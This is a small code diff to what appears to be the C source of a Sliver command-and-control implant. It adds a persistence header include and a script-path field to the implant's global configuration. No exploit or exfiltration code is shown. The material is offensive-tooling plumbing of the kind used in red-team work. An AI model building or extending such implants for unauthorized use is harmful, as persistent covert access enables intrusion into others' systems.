@@ -28,6 +28,7 @@ typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
 #include "Pivot.h"
 #include "Socket.h"
 #include "NamedPipe.h"
+#include "Persistence.h"
 
 struct _GLOBAL_CONFIG {
 	CHAR szSessionID[33];
@@ -50,6 +51,7 @@ struct _GLOBAL_CONFIG {
 	PPIVOT_LISTENER* Listeners;
 	DWORD dwNumberOfListeners;
 	SRWLOCK RWLock;
+	LPWSTR lpScriptPath;
 };
 
 typedef struct _SLIVER_RESP {
